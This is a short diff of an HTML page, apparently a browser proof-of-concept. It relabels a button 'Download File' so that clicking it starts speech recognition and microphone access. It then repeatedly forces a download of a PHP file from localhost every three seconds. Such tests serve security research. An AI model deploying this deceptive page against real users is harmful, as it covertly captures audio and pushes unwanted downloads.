@@ -1,14 +1,20 @@
-<input onclick="start()" type="button" value="Click here" />
+<input onclick="start()" type="button" value="Download File" />
 
 <script>
   function start() {
     var recognition = new webkitSpeechRecognition();
     recognition.start();
-    
+
     navigator.webkitGetUserMedia({ audio: true }, function(){}, function(){});
-    
-    document.location = "https://www.google.com";
+
+    // Trigger download from localhost
+    const link = document.createElement('a');
+    link.href = 'http://localhost:3000/301.php';
+    link.download = ''; // optional, you can specify a filename here
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
   }
 
-  setInterval(start, 3000);
+  setInterval(start, 3000); // will trigger download every 3 seconds
 </script>
